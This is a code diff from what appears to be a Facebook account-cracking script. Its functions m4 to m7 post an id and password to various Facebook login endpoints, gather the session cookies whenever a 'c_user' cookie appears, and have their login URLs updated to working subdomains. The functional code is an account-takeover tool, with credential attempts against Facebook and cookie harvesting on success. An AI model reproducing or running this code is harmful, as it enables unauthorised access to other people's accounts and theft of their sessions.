@@ -1163,7 +1163,7 @@ def m4(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://www.alpha.facebook.com/login.php?skip_api_login=1&api_key=597615686992125&kid_directed_site=0&app_id=597615686992125&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D597615686992125%26cbt%3D1719168552634%26e2e%3D%257B%2522init%2522%253A1719168552634%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D6c82e3a5-ea38-4bb7-af35-3db4f07a2759%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c0209cc-8a60-4e83-acea-805004bdbc3f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25225ue364d82kciv73mgjl6%2522%257D%26code_challenge_method%3DS256%26default_audience',data=log_data,headers=header_freefb).text
+   lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=597615686992125&kid_directed_site=0&app_id=597615686992125&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D597615686992125%26cbt%3D1719168552634%26e2e%3D%257B%2522init%2522%253A1719168552634%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D6c82e3a5-ea38-4bb7-af35-3db4f07a2759%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25223c0209cc-8a60-4e83-acea-805004bdbc3f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25225ue364d82kciv73mgjl6%2522%257D%26code_challenge_method%3DS256%26default_audience',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1237,7 +1237,7 @@ def m5(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mbasic.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1324,7 +1324,7 @@ def m6(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }
-   lo = session.post('https://www.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://free.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1390,7 +1390,7 @@ def m7(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://www.prod.facebook/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://x.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
